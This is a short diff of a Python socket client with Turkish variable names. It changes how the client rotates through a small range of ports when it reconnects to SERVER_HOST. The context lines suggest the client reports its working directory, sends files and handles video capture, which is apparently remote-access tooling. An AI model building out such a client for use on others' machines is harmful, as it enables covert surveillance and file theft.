@@ -58,7 +58,10 @@ while True:
         
         baglanti.close()
 
-        pport += 1
+        if pport == SERVER_PORT+5:
+            pport = SERVER_PORT
+        else:
+            pport += 1
         baglanti = socket.socket()
         baglanti.connect((SERVER_HOST, pport))
         cwd = os.getcwd()
@@ -76,7 +79,10 @@ while True:
                 file.close()
                 baglanti.close()
                 
-                pport += 1
+                if pport == SERVER_PORT+5:
+                    pport = SERVER_PORT
+                else:
+                    pport += 1
                 baglanti = socket.socket()
                 baglanti.connect((SERVER_HOST, pport))
                 cwd = os.getcwd()
@@ -105,7 +111,10 @@ while True:
                     vid.release()
                     break
             break
-        pport += 1
+        if pport == SERVER_PORT+5:
+            pport = SERVER_PORT
+        else:
+            pport += 1
         baglanti = socket.socket()
         baglanti.connect((SERVER_HOST, pport))
         cwd = os.getcwd()
